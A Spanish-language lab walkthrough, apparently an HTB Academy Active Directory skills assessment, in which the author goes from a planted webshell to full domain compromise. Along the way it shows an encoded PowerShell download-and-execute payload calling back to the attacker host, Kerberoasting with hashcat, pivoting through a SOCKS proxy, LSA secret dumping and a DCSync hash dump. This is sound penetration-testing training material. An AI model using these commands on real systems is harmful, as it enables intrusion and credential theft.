
# AD - Skills Assessment I

## Enumeración y ataques en Active Directory: Evaluación de habilidades, parte I

***

## <mark style="color:purple;">Escenario</mark>

Un miembro del Red Team inició una prueba de penetración externa y fue trasladado a otro proyecto urgente antes de que pudiera terminar. El miembro del equipo pudo encontrar y explotar una vulnerabilidad de carga de archivos después de realizar un reconocimiento del servidor web externo. Antes de cambiar de proyecto, nuestro compañero de equipo dejó un webshell protegido con contraseña (con las credenciales: `admin:My_W3bsH3ll_P@ssw0rd!/uploads`) en su lugar para que comenzáramos desde el directorio.&#x20;

Como parte de esta evaluación, nuestro cliente, Inlanefreight, nos ha autorizado a ver hasta dónde podemos llegar y está interesado en ver qué tipos de problemas de alto riesgo existen dentro del entorno de AD. Aprovechar el webshell para obtener un punto de apoyo inicial en la red interna. Enumerar el entorno de Active Directory en busca de fallas y configuraciones incorrectas para moverse lateralmente y, en última instancia, lograr la vulneración del dominio.

Aplique lo aprendido en este módulo para comprometer el dominio y responder las preguntas a continuación para completar la parte I de la evaluación de habilidades.

### Objetivo

```
10.129.193.86
admin:My_W3bsH3ll_P@ssw0rd!/uploads
```

### Pregunta 1

Envíe el contenido del archivo flag.txt en el escritorio del administrador del servidor web

Lo primero abrimos la IP en un navegador para encontrar la webshell, que está en el directorio uploads:

<figure><img src="/files/DDlE42gGWacEwtFjS8hs" alt=""><figcaption></figcaption></figure>

Al entrar en antak.aspx nos pide la contraseña. La introducimos y accedemos correctamente a la webshell:

<figure><img src="/files/sYLIPWYgny7ypo0slFvd" alt=""><figcaption></figcaption></figure>

Ya de entrada vemos que tenemos permisos `SYSTEM`, y estamos en la ruta `C:\windows\system32\inetsrv`, vamos a ver que usuarios hay en el sistema y si podemos acceder al escritorio del administrador.

<figure><img src="/files/rIWt4uxEHCtZ069LPS6s" alt=""><figcaption></figcaption></figure>

Con el comando `net user` encontramos la cuenta de Administrador a la que debemos acceder. No nos deja movernos por la estructura de carpetas con cd, por lo que solamente podremos leer los archivos.

<figure><img src="/files/cCzTEWUsk1b7arjPMeM6" alt=""><figcaption></figcaption></figure>

### Pregunta 2

> Realiza un ataque Kerberosting contra una cuenta con el SPN `MSSQLSvc/SQL01.inlanefreight.local:1433` y envía el nombre de la cuenta como respuesta

Lo primero vamos a crear una shell interactiva con Metasploit y Web Delivery para tener un mayor control sobre el sistema y poder navegar cómodamente entre los directorios:

{% code overflow="wrap" %}

```sh
afsh4ck@kali$ msfconsole -q

msf6 exploit(multi/script/web_delivery) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/script/web_delivery) > set LHOST 10.10.15.207
LHOST => 10.10.15.207
msf6 exploit(multi/script/web_delivery) > set SRVHOST 10.10.15.207
SRVHOST => 10.10.15.207
msf6 exploit(multi/script/web_delivery) > set TARGET 2
TARGET => 2
msf6 exploit(multi/script/web_delivery) > exploit
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/script/web_delivery) > 
[*] Started reverse TCP handler on 10.10.15.207:4444 
[*] Using URL: http://10.10.15.207:8080/MpfELDGgYvxnbFi
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB0AFYAVQA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJAB0AFYAVQAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAHQAVgBVAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA1AC4AMgAwADcAOgA4ADAAOAAwAC8ATQBwAGYARQBMAEQARwBnAFkAdgB4AG4AYgBGAGkALwA2AHgAZABoAEgAZgA1ACcAKQApADsASQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADUALgAyADAANwA6ADgAMAA4ADAALwBNAHAAZgBFAEwARABHAGcAWQB2AHgAbgBiAEYAaQAnACkAKQA7AA==
```

{% endcode %}

Copiamos el payload completo en la webshell y obtenemos una sesión de Meterpreter en el background:

<figure><img src="/files/2KOO1MMiWBM0jcgt3jbv" alt=""><figcaption></figcaption></figure>

Es recomendable, una vez ganada la sesión de Meterpreter, migrar la sesión a un proceso más estable, como `winlogon.exe` por ejemplo:

```bash
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x64   0
 84    632   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 104   4     Registry           x64   0
 300   4     smss.exe           x64   0
 372   632   svchost.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 380   632   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 384   376   csrss.exe          x64   0
 492   376   wininit.exe        x64   0
 500   484   csrss.exe          x64   1
 504   632   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 556   484   winlogon.exe       x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
```

```bash
meterpreter > migrate 556
[*] Migrating from 712 to 556...
[*] Migration completed successfully.
meterpreter > 
```

Ahora si, nos vamos a enviar PowerView desde nuestra máquina de atacante Kali Linux para empezar a enumerar información de los usuarios AD:

1. Pasar de Meterpreter a shell
2. En nuestra máquina de atacante abrir un servidor local con python en la carpeta de PowerView
3. Ir al directorio raiz y descargar el archivo con `certutil.exe`

```bash
certutil.exe -f -urlcache -split http://<IP-Kali-Linux>/PowerView.ps1
```

<figure><img src="/files/g7chpJZeCVXX745hLF9l" alt=""><figcaption></figcaption></figure>

En este punto vamos a pasar de shell a Powershell para importar PowerView

```powershell
C:\>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> Import-Module .\PowerView.ps1
Import-Module .\PowerView.ps1
PS C:\> 
```

Y ahora ya si empieza la enumeración de las cuentas con SPN configurado

```powershell
PS C:\> Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName

serviceprincipalname                        samaccountname
--------------------                        --------------
adfsconnect/azure01.inlanefreight.local     azureconnect  
backupjob/veam001.inlanefreight.local       backupjob     
kadmin/changepw                             krbtgt        
MSSQLSvc/DEVTEST.inlanefreight.local:1433   sqltest       
MSSQLSvc/QA001.inlanefreight.local:1433     sqlqa         
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 sqldev        
MSSQLSvc/SQL01.inlanefreight.local:1433     svc_sql       
MSSQLSvc/SQL02.inlanefreight.local:1433     sqlprod       
```

La cuenta objetivo según la pregunta 2 sería el usuario `svc_sql`, así que vamos a extraer el TGS de este usuario y crackearlo

### Pregunta 3

Extrae el TGS de svc\_sql, descifra la contraseña de la cuenta y envia el valor en texto plano.

Podemos extraer directamente el ticket con el siguiente comando:

```powershell
PS C:\> Get-Domainuser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
Get-Domainuser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat


SamAccountName       : svc_sql
DistinguishedName    : CN=svc_sql,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
ServicePrincipalName : MSSQLSvc/SQL01.inlanefreight.local:1433
TicketByteHexStream  : 
Hash                 : $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$4FAC98679DFE16
                       36503B617B2CDB5363$0BBD621361344E5AF1CD5D12246352B46B0CB745159B41D60511C298B5A584C0504AFEF415134
                       F25051592A850731DCA3C228C51FE983CAE4396E0D8FB76BDB9CFA965C5DC71CD7075CA654167BC5CFBAC2C5582AA7D1
                       F216EE9FE2A795F93C829FDF77027BF44751EC3B6A65C8F3CA50BB1D27B1BDE7592C3CD440D4260579C678E15DE81E4B
                       B0E158D6E5C6436217A53832827B12A8B829612EB180C3912CE5574E4DAE6D18897572E2EF5BE3E75C9AEE2438A5A92B
                       1B0F8B2A1B6CBE699926AF4A4F2CAA3125878F8F77BA6DA5909397BC41E82398D18183900AC7D8ECF18797C57651E50C
                       14B31A3728891E64C60D6D9459C9E80BBD0E8A1FEBC97F1A95953BD85AB41A518CC48AA3A4880BF8D2D73E6FE72CE56C
                       B58CB64AA79D9EB0211E48CA5BC8A7559B8B1614995B7AA72C78F17E9FEEF7EBF97EE3E8419BBE6079DA31EF17EFCEC7
                       B1294CB41EEABA1DBCD5C18FD6491862AD09C248B10C6F540D34F440873810208CB56829CED4871B2B5D61275FFDBE9E
                       C79F7644761CDC572839F35B77355D2C1041ED2E05BDF3AEF1FACA89470BD89CCB033015398C1073CBF0C942FC0249E5
                       AE9E391DE764021BCFCBB9EC1E5A8845056060961FA706674517E76A5B8F2CC7043B0F4983F9805701353C72E940B939
                       6B13B8740199561F68D97C7485B5B0F0994A9DCDDE630DC0AE72ECE52BF7F79F1F3F079EC26F561517E45FECCE79C57E
                       12966305E12318974F1DC5A1B47137E5ED38E0B9149DA71AF9AAB98D52B3AC297FE49BB8D31B4BCABC6AAE3C88540D28
                       D807DFA5210616ABF2D27826ECADFA97F91EF9784D380268BB7485EB56C03B68937037436A0B16B7881486909471B07C
                       D74E4041D1FB1EA6BD0A7C529EEBA8AE43A191A8BF7DA7419436A60E4F8AB0771BF9506761B91E27506E86C2C19D1232
                       08408874AF5455E59E608FBA2922DCE25E191FD65820CA19501F66DCA611D093A9C18D0A72C7CE8CB23EA7E61F71FED4
                       14D9B65AE94C11261A8232B588000D9F9D694F91AE45E27A8E454808FA687462F5BA00E3FBAB13330520FDB6AF11C0CA
                       E4DAAFAD398375EC857D100E71529A74E431C81AD09E5F3A72DC88C23058035C4FCC88F1445B5DA97568EE5A2C303FB2
                       5ACCA5EBF5D5CD2E33124A0D5A524807EA183418073C621364D6669DC1F1772A6CE5AE1157801D368567D54D6A44CCE7
                       BA9268C7D3C4A3ECB5BC0342987DC78328BBFDC7075F5252E964433B96D9029CA56BE9DB3CA7888077899C3E6381E50C
                       054CA7DBC6A1883B40927B87FC66290DF141FCB8A08497CC91764D4BDDD4DBE0C1E6E39C0D2F6467BA2FA2391BD977FD
                       C3D2DB44B5454E7D5BE5FC89AFED584A9C29E7470EB7D34777A681FB5836FDC3967D2F88D07C8B945E1A5FC551825BB8
                       1B60E0F72322DE95336160CB9A60B8F38196D0C6B231D44C825F9C25B9E5BC314BEAC040249759B7295F211E9BD4F41A
                       947A79EA370FA5E36DC1FF824FDE383AC39726ED8FEFBC2CECEE7FBFD713AE5F969
```

Ahora vamos a copiar el hash a un archivo de texto y a eliminar todos los espacios y saltos de línea. Lo podemos hacer con este comando por ejemplo, que nos crea otro archivo sin espacios:

```bash
tr -d '[:space:]' < svc_sql-ticket > svc_sql-ticket-no-spaces
```

#### Cracking con Hashcat

{% code overflow="wrap" %}

```
hashcat -m 13100 svc_sql-ticket-no-spaces /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
==========================================================================================================================================
* Device #1: cpu--0x000, 2137/4338 MB (1024 MB allocatable), 4MCU

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/SQL01.inlanefreight.local:1433*$4fac98679dfe1636503b617b2cdb5363$0bbd621361344e5af1cd5d12246352b46b0cb745159b41d60511c298b5a584c0504afef415134f25051592a850731dca3c228c51fe983cae4396e0d8fb76bdb9cfa965c5dc71cd7075ca654167bc5cfbac2c5582aa7d1f216ee9fe2a795f93c829fdf77027bf44751ec3b6a65c8f3ca50bb1d27b1bde7592c3cd440d4260579c678e15de81e4bb0e158d6e5c6436217a53832827b12a8b829612eb180c3912ce5574e4dae6d18897572e2ef5be3e75c9aee2438a5a92b1b0f8b2a1b6cbe699926af4a4f2caa<------SNIP------> e95336160cb9a60b8f38196d0c6b231d44c825f9c25b9e5bc314beac040249759b7295f211e9bd4f41a947a79ea370fa5e36dc1ff824fde383ac39726ed8fefbc2cecee7fbfd713ae5f969:lucky7
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*svc_sql$INLANEFREIGHT.LOCAL$MSSQLSvc/S...e5f969
Time.Started.....: Mon Jul 29 20:02:52 2024 (0 secs)
Time.Estimated...: Mon Jul 29 20:02:52 2024 (0 secs)
```

{% endcode %}

Buum! Obtenemos la contraseña en plano para la cuenta svc\_sql: `lucky7` 🏆

### Pregunta 4

Envíe el contenido del archivo flag.txt del escritorio del administrador en MS01

Para ello tenemos que pivotar desde nuestro punto de apoyo, y en Meterpreter vamos a hacer un autoroute a toda la red AD, y nos llevamos la sesión de Meterpreter al background:

```bash
Terminate channel 1? [y/N]  y
meterpreter > run autoroute -s 172.16.6.0/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.6.0/255.255.255.0...
[+] Added route to 172.16.6.0/255.255.255.0 via 10.129.193.86
[*] Use the -p option to list all active routes

meterpreter > bg

Backgrounding session 1
```

Ahora que hemos hecho el autoroute vamos a usar un módulo de Metasploit `scanner/portscan/tcp` para escanear todas las máquinas de la red (`0/24`). Filtramos por los puertos `139` y `445` que son los comunes en máquinas Windows

```bash
msf6 auxiliary(scanner/portscan/tcp) > set rhosts 172.16.6.0/24
rhosts => 172.16.6.0/24
PORTS => 139,445canner/portscan/tcp) > set PORTS 139,445 
msf6 auxiliary(scanner/portscan/tcp) > set threads 50
threads => 50
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 172.16.6.3:           - 172.16.6.3:445 - TCP OPEN
[+] 172.16.6.3:           - 172.16.6.3:139 - TCP OPEN
[+] 172.16.6.50:          - 172.16.6.50:445 - TCP OPEN
[+] 172.16.6.50:          - 172.16.6.50:139 - TCP OPEN
[*] 172.16.6.0/24:        - Scanned  51 of 256 hosts (19% complete)
[+] 172.16.6.100:         - 172.16.6.100:445 - TCP OPEN
[+] 172.16.6.100:         - 172.16.6.100:139 - TCP OPEN
[*] 172.16.6.0/24:        - Scanned  52 of 256 hosts (20% complete)
[*] 172.16.6.0/24:        - Scanned 103 of 256 hosts (40% complete)
[*] 172.16.6.0/24:        - Scanned 154 of 256 hosts (60% complete)
[*] 172.16.6.0/24:        - Scanned 208 of 256 hosts (80% complete)
[*] 172.16.6.0/24:        - Scanned 256 of 256 hosts (100% complete)
[*] Auxiliary module execution completed
```

Hemos encontrado 3 hosts activos:

```bash
172.16.6.3      # Domain Controller (Siempre termina en un número bajo)
172.16.6.50     # MS01
172.16.6.100    # ?
```

Ahora para movernos lateralmente vamos a configurar un socks proxy con Metasploit:

```bash
msf6 auxiliary(server/socks_proxy) > run
[*] Auxiliary module running as background job 1.

msf6 auxiliary(server/socks_proxy) > 
[*] Starting the SOCKS proxy server
```

Ahora tenemos que editar el archivo de configuración de proxychains en `/etc/proxychains4.conf` y editar la linea del final para que apunte al puerto 1080 (ya que el socks\_proxy de metasploit trabaja por este puerto por defecto):

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4  127.0.0.1 9050
socks5	127.0.0.1 1080
```

#### Extracción de la flag

```bash
sudo proxychains evil-winrm -i 172.16.6.50 -u svc_sql -p lucky7                           
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.50:5985  ...  OK
*Evil-WinRM* PS C:\Users\svc_sql.INLANEFREIGHT\Documents> cd C:\Users
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.50:5985 ls ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.50:5985  ...  OK

*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        3/30/2022   4:57 AM                Administrator
d-----        4/11/2022   7:58 PM                administrator.INLANEFREIGHT
d-----        10/6/2021  12:31 PM                lab_adm
d-r---        10/6/2021   3:46 PM                Public
d-----        3/30/2022   5:00 AM                svc_sql
d-----        4/11/2022   7:55 PM                svc_sql.INLANEFREIGHT
d-----        4/11/2022   7:13 PM                tpetty


*Evil-WinRM* PS C:\Users> cd Administrator/Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/11/2022   8:01 PM             29 flag.txt


*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat flag.txt
spn$_r0ast1ng_on_@n_0p3n_f1r3
```

Ya tenemos la flag! 🏆

### Pregunta 5

Busque credenciales en plano para otro usuario de dominio. Envíe el nombre de usuario y contraseña como respuesta.

Ahora que tenemos todo configurado vamos a usar Crackmapexec SMB para obtener mucha más información con las credenciales que hemos descubierto:

```shell-session
afsh4ck@kali$ sudo proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
[sudo] contraseña para kali: 
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.50:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.50:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.50:135  ...  OK
SMB         172.16.6.50     445    MS01             [*] Windows 10.0 Build 17763 x64 (name:MS01) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.50:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.50:445  ...  OK
SMB         172.16.6.50     445    MS01             [+] INLANEFREIGHT.LOCAL\svc_sql:lucky7 (Pwn3d!)
SMB         172.16.6.50     445    MS01             [+] Dumping LSA secrets
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/tpetty:$DCC2$10240#tpetty#685decd67a67f5b6e45a182ed076d801: (2022-04-29 21:18:01)
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/svc_sql:$DCC2$10240#svc_sql#acc5441d637ce6aabf3a3d9d4f8137fb: (2022-04-12 02:51:02)
SMB         172.16.6.50     445    MS01             INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#9553faad97c2767127df83980f3ac245: (2022-04-20 10:25:07)
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes256-cts-hmac-sha1-96:b98c9c990c7a08fadbc329c5fe59690a52835b24ef0233ad51af7d6a6338ddb8
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aes128-cts-hmac-sha1-96:2c4a51903a90716c11c54202ed74d040
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:des-cbc-md5:1f8c624601867632
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:plain_password_hex:5e006b00460029006e00460059006a005f006b0020005100640036003400520062005300400026002900280068006e004c0030004000780069003d00210051005d00740051005c006a0064004e004600780072006f007100750057006100400043006400540076005c00580072005e0072006b003b00470058007a00720024006d00480046004c003500600050002a003b003500640044005d00750036004e0063005f0039003500490054005c0031006a004e0030004d0067004f004a006b0022004000280037006a0048003100750034003f003300450059005f0037006f003800620035002d00660063004c003d00
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\MS01$:aad3b435b51404eeaad3b435b51404ee:ecfe27900016073fffef1bb4b2132bb2:::
SMB         172.16.6.50     445    MS01             INLANEFREIGHT\tpetty:Sup3rS3cur3D0m@inU2eR
SMB         172.16.6.50     445    MS01             dpapi_machinekey:0x8dbe842a7352000be08ef80e32bb35609e7d1786
dpapi_userkey:0xb20d199f3d953f7977a6363a69a9fe21d97ecd19
SMB         172.16.6.50     445    MS01             NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         172.16.6.50     445    MS01             [+] Dumped 11 LSA secrets to /root/.cme/logs/MS01_172.16.6.50_2024-07-29_204614.secrets and /root/.cme/logs/MS01_172.16.6.50_2024-07-29_204614.cached
```

Obtenemos credenciales en texto plano: `tpetty:Sup3rS3cur3D0m@inU2eR`

### Pregunta 6

¿Qué ataque puede realizar este usuario?

```powershell
C:\>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\> Import-Module .\PowerView.ps1
Import-Module .\PowerView.ps1

PS C:\> $sid = Convert-NameToSid tpetty
$sid = Convert-NameToSid tpetty

PS C:\> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl


AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-In-Filtered-Set

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes

AceQualifier          : AccessAllowed
ObjectDN              : DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights : ExtendedRight
SecurityIdentifier    : S-1-5-21-2270287766-1317258649-2146029398-4607
ObjectAceType         : DS-Replication-Get-Changes-All
```

Vemos que tiene permisos DS-Replication-Get-Changes-All lo que le permitiría realizar un ataque `DCSync`

Igualmente podríamos ejecutar el siguiente comando para ver todos los usuarios del sistema con Permisos DCSync

```powershell
PS C:\> Get-ObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"} | select ObjectDN, ObjectAceType, @{name="Name"; expression={Convert-SidToName $_.SecurityIdentifier}}
Get-ObjectAcl -ResolveGUIDs | ? {$_.ObjectAceType -match "DS-Replication-Get-Changes"} | select O
bjectDN, ObjectAceType, @{name="Name"; expression={Convert-SidToName $_.SecurityIdentifier}}

ObjectDN                             ObjectAceType                              Name                                   
--------                             -------------                              ----                                   
DC=INLANEFREIGHT,DC=LOCAL            DS-Replication-Get-Changes-In-Filtered-Set INLANEFREIGHT\tpetty                   
DC=INLANEFREIGHT,DC=LOCAL            DS-Replication-Get-Changes                 INLANEFREIGHT\Enterprise Read-only D...
DC=INLANEFREIGHT,DC=LOCAL            DS-Replication-Get-Changes                 INLANEFREIGHT\tpetty                   
DC=INLANEFREIGHT,DC=LOCAL            DS-Replication-Get-Changes-All             INLANEFREIGHT\Domain Controllers       
DC=INLANEFREIGHT,DC=LOCAL            DS-Replication-Get-Changes-All             INLANEFREIGHT\tpetty                   
DC=INLANEFREIGHT,DC=LOCAL            DS-Replication-Get-Changes-In-Filtered-Set BUILTIN\Administrators                 
DC=INLANEFREIGHT,DC=LOCAL            DS-Replication-Get-Changes                 BUILTIN\Administrators                 
DC=INLANEFREIGHT,DC=LOCAL            DS-Replication-Get-Changes-All             BUILTIN\Administrators                 
DC=INLANEFREIGHT,DC=LOCAL            DS-Replication-Get-Changes-In-Filtered-Set Enterprise Domain Controllers          
DC=INLANEFREIGHT,DC=LOCAL            DS-Replication-Get-Changes                 Enterprise Domain Controllers          
CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL DS-Replication-Get-Changes                 INLANEFREIGHT\Enterprise Read-only D...
CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL DS-Replication-Get-Changes-All             INLANEFREIGHT\Domain Controllers       
CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL DS-Replication-Get-Changes-In-Filtered-Set BUILTIN\Administrators                 
CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL DS-Replication-Get-Changes                 BUILTIN\Administrators                 
CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL DS-Replication-Get-Changes-All             BUILTIN\Administrators                 
CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL DS-Replication-Get-Changes-In-Filtered-Set Enterprise Domain Controllers          
CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL DS-Replication-Get-Changes                 Enterprise Domain Controllers  
```

### Pregunta 7

Tome el control del dominio y envíe el contenido del archivo flag.txt en el escritorio del administrador en DC01

#### Ataque DCSync desde Linux

Con el siguiente ataque DCSync obtenemos todos los hashes de todos los usuarios del dominio, con lo que estaría completamente comprometido:

```shell-session
afsh4ck@kali$ sudo proxychains impacket-secretsdump -just-dc tpetty:"Sup3rS3cur3D0m@inU2eR"@172.16.6.3
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/aarch64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.11.0 - Copyright 2023 Fortra

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.3:445  ...  OK
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.3:135  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.16.6.3:49667  ...  OK
Administrator:500:aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6dbd63f4a0e7c8b221d61f265c4a08a7:::
inlanefreight.local\avazquez:1714:aad3b435b51404eeaad3b435b51404ee:762cbc5ea2edfca03767427b2f2a909f:::
inlanefreight.local\pfalcon:1715:aad3b435b51404eeaad3b435b51404ee:f8e656de86b8b13244e7c879d8177539:::
inlanefreight.local\fanthony:1716:aad3b435b51404eeaad3b435b51404ee:9827f62cf27fe221b4e89f7519a2092a:::
inlanefreight.local\wdillard:1717:aad3b435b51404eeaad3b435b51404ee:69ada25bbb693f9a85cd5f176948b0d5:::
inlanefreight.local\lbradford:1718:aad3b435b51404eeaad3b435b51404ee:0717dbc7b0e91125777d3ff4f3c00533:::
inlanefreight.local\sgage:1719:aad3b435b51404eeaad3b435b51404ee:31501a94e6027b74a5710c90d1c7f3b9:::
inlanefreight.local\asanchez:1720:aad3b435b51404eeaad3b435b51404ee:c6885c0fa57ec94542d362cf7dc2d541:::
inlanefreight.local\dbranch:1721:aad3b435b51404eeaad3b435b51404ee:a87c92932b0ef15f6c9c39d6406c3a75:::
inlanefreight.local\ccruz:1722:aad3b435b51404eeaad3b435b51404ee:a9be3a88067ed776d0e2cf4ccde8ec8f:::
